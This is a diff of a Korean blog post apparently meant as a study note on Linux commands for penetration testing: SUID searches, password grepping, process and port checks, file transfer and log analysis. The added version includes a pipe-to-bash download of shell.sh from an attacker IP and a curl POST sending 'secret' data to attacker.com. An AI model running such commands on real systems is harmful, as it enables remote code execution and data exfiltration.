@@ -1,105 +1,112 @@
 ---
 layout: post
-title: "리눅스 명령어 공부"
+title: "Linux Hacking Commands"
 date: 2025-09-02 17:00:00 +0900
 categories: [system-hacking]
 ---
 
 ## 1. 개요
 
-침투 테스트 및 보안 분석 과정에서 리눅스 명령어는 기본적인 도구로 활용된다. 시스템 정보 수집, 서비스 확인, 스크립트 준비 등 다양한 작업이 터미널을 통해 이루어진다.
+**리눅스 명령어**는 시스템 해킹 및 보안 분석 과정에서 가장 기본적이면서도 강력한 무기이다.
+GUI가 없는 서버 환경(Shell)에서 타겟 시스템의 정보를 수집하고, 취약점을 탐색하며, 권한 상승을 시도하기 위해서는 다양한 터미널 명령어를 능숙하게 다룰 수 있어야 한다.
+
+### 주요 활용 분야
+1.  **정보 수집 (Enumeration)**: 시스템 버전, 사용자 계정, 네트워크 상태 확인.
+2.  **파일 탐색**: 설정 파일, 키 파일, SUID 파일 등 민감 정보 검색.
+3.  **흔적 지우기 및 분석**: 로그 확인 및 정리.
 
 ---
 
-## 2. 파일 및 텍스트 처리
+## 2. 파일 탐색 (File Discovery)
 
-*   **`find`**: 특정 조건의 파일을 검색한다. 권한 상승의 단서가 되는 SUID 설정 파일이나 설정 오류가 의심되는 파일을 찾을 때 유용하다.
-    *   **주요 옵션:**
-        *   `-perm`: 특정 권한을 가진 파일을 검색한다. (`-u=s`, `-4000`은 SUID)
-        *   `-name`: 특정 이름 패턴을 가진 파일을 검색한다.
-        *   `-type`: 파일의 종류를 지정한다. (`f`: 파일, `d`: 디렉터리)
-    ```bash
-    # 루트 디렉터리부터 SUID 비트가 설정된 파일을 검색하고 권한 오류는 출력하지 않음
-    find / -perm -u=s -type f 2>/dev/null
-    ```
-*   **`grep`**: 파일이나 파이프라인 출력에서 특정 문자열 패턴을 필터링한다. 로그 파일 분석이나 설정 파일에서 민감 정보를 찾을 때 사용된다.
-    *   **주요 옵션:**
-        *   `-r`: 지정된 디렉터리의 하위 폴더까지 재귀적으로 검색한다.
-        *   `-i`: 대소문자를 구분하지 않고 검색한다.
-        *   `-v`: 특정 패턴을 제외한 모든 라인을 출력한다.
-    ```bash
-    # 웹 서버 설정 파일 디렉터리부터 'password' 문자열을 하위 폴더까지 검색
-    grep -r "password" /etc/apache2/
-    ```
+### find
+특정 속성을 가진 파일을 검색한다. 권한 상승 벡터인 **SUID** 파일이나 설정 오류를 찾을 때 핵심적인 역할을 한다.
 
----
+```bash
+# SUID 비트가 설정된 모든 파일 검색 (권한 상승 시도용)
+find / -perm -u=s -type f 2>/dev/null
 
-## 3. 프로세스 및 네트워크 확인
+# 쓰기 권한이 있는 디렉터리 검색 (World Writable)
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+```
 
-*   **`ps`**: 현재 시스템에서 동작하고 있는 프로세스의 목록을 보여준다. 이를 통해 시스템 권한으로 실행되는 비정상적인 프로세스를 확인할 수 있다.
-    *   **주요 옵션 조합 `aux`:**
-        *   `a`: 다른 사용자의 프로세스도 보여준다.
-        *   `u`: 사용자 중심의 포맷으로 출력한다.
-        *   `x`: 터미널에 연결되지 않은 프로세스(데몬)도 보여준다.
-    ```bash
-    # 시스템에서 실행 중인 모든 프로세스를 상세 정보와 함께 보여줌
-    ps aux
-    ```
-*   **`netstat`**: 현재 시스템에서 열려 있는 포트와 네트워크 연결 상태를 보여준다. 최신 시스템에서는 `ss` 명령어가 더 빠른 성능을 보인다.
-    *   **주요 옵션 조합 `tulpn`:**
-        *   `t`: TCP 포트를 보여준다.
-        *   `u`: UDP 포트를 보여준다.
-        *   `l`: 연결 대기(Listen) 상태의 포트만 보여준다.
-        *   `p`: 해당 포트를 사용하는 프로세스의 이름과 PID를 보여준다.
-        *   `n`: 호스트 이름 대신 IP 주소로 보여준다.
-    ```bash
-    # 리스닝 중인 모든 TCP/UDP 포트와 해당 포트를 사용하는 프로세스 정보를 보여줌
-    netstat -tulpn
-    ```
+### grep
+파일 내용에서 특정 패턴을 찾는다. 소스 코드나 설정 파일에서 하드코딩된 비밀번호를 찾을 때 유용하다.
+
+```bash
+# 재귀적으로 'password' 문자열 검색 (대소문자 무시)
+grep -r -i "password" /var/www/html/
+
+# 주석(#)을 제외한 설정 확인
+grep -v "^#" /etc/ssh/sshd_config
+```
 
 ---
 
-## 4. 원격 데이터 전송
+## 3. 시스템 상태 확인 (System Status)
 
-*   **`wget`**: 원격 서버의 파일을 다운로드하여 저장한다. 공격자 PC의 웹 서버에서 권한 상승 진단 스크립트(`linpeas.sh`)를 공격 대상 서버로 옮길 때 사용된다.
-    *   **주요 옵션:**
-        *   `-q`: 다운로드 과정을 출력하지 않는다 (Quiet).
-        *   `-O <file>`: 다운로드한 내용을 지정된 파일 이름으로 저장한다. (`-O -`는 표준 출력으로 보냄)
-    ```bash
-    # 공격자 PC에서 실행 중인 웹 서버로부터 linpeas.sh를 다운로드
-    wget http://[Attacker IP]:8000/linpeas.sh
-    ```
-*   **`curl`**: URL을 통해 데이터를 전송하고 그 결과를 터미널에 직접 출력한다. 파일 저장 없이 API 응답을 확인하거나 웹 페이지 소스를 분석할 때 유용하다.
-    *   **주요 옵션:**
-        *   `-X <METHOD>`: `GET`, `POST` HTTP 메서드를 지정한다.
-        *   `-d <data>`: `POST` 요청 시 전송할 데이터를 지정한다.
-    ```bash
-    # DVWA 로그인 페이지에 POST 요청을 보내고 응답을 확인
-    curl -X POST -d "username=admin&password=password&Login=Login" http://[Attacker IP]/login.php
-    ```
+### ps (Process Status)
+현재 실행 중인 프로세스를 확인하여, 루트 권한으로 실행 중인 취약한 서비스가 있는지 파악한다.
+
+```bash
+# 모든 프로세스 상세 출력
+ps aux
+
+# 특정 서비스(예: ssh) 확인
+ps aux | grep ssh
+```
+
+### netstat / ss
+네트워크 연결 상태와 열려 있는 포트를 확인한다.
+
+```bash
+# Listening 중인 TCP/UDP 포트와 프로세스 확인
+ss -tulpn
+# 또는
+netstat -tulpn
+```
 
 ---
 
-## 5. 기본 로그 분석
+## 4. 파일 전송 (File Transfer)
 
-시스템에 남겨진 로그 파일을 분석하여 공격 시도나 비정상적인 활동을 탐지할 수 있다. `grep`, `tail`과 같은 명령어는 대량의 로그에서 유의미한 정보를 필터링하는 데 사용된다.
+공격자 머신에서 타겟 머신으로 툴(Exploit, Script)을 전송하거나, 반대로 데이터를 유출할 때 사용한다.
 
-#### ***주요 로그 파일 (Ubuntu 기준)***
-*   `/var/log/auth.log`: 사용자 로그인, `sudo` 명령어 사용 인증 관련 기록.
-*   `/var/log/apache2/access.log`: 웹 서버 접속 기록.
+### wget
+```bash
+# 공격자 웹 서버(Python http.server)에서 파일 다운로드
+wget http://10.10.10.10:8000/linpeas.sh -O /tmp/linpeas.sh
+```
 
-#### ***로그 분석 예시***
-*   **SSH 로그인 실패 기록 확인:**
-    `/var/log/auth.log` 파일에서 "Failed password" 문자열을 검색하여 무차별 대입 공격 시도를 탐지한다.
-    ```bash
-    grep "Failed password" /var/log/auth.log
-    ```
-*   **특정 IP의 웹 서버 접근 기록 확인:**
-    `access.log`에서 특정 IP의 접근 기록을 필터링한다.
-    ```bash
-    grep "[Attacker IP]" /var/log/apache2/access.log
-    ```
+### curl
+```bash
+# 파일 다운로드 및 실행 (파이프)
+curl http://10.10.10.10/shell.sh | bash
 
-이러한 로그 분석은 [A09: 보안 로깅 및 모니터링 실패](https://hamap0.github.io/projects/owasp-top-10/2025/09/02/A09_Security-Logging-and-Monitoring-Failures.html) 프로젝트에서 로그의 중요성을 이해하는 기반이 된다.
+# POST 요청으로 데이터 전송
+curl -X POST -d "data=secret" http://attacker.com/log
+```
+
+---
+
+## 5. 로그 분석 및 트러블슈팅
+
+시스템 관리자는 침해 사고 분석을 위해, 공격자는 자신의 흔적을 확인하기 위해 로그를 분석한다.
+
+### 주요 로그 파일 위치
+| 로그 파일 | 설명 |
+|-----------|------|
+| `/var/log/auth.log` | 인증, 로그인, sudo 사용 기록 |
+| `/var/log/syslog` | 시스템 전반적인 메시지 |
+| `/var/log/apache2/access.log` | 웹 서버 접근 기록 |
+
+### 분석 예시
+```bash
+# SSH 로그인 실패 기록 실시간 확인
+tail -f /var/log/auth.log | grep "Failed password"
+
+# 특정 IP의 웹 요청만 필터링
+grep "192.168.1.50" /var/log/apache2/access.log
+```
 
 <hr class="short-rule">
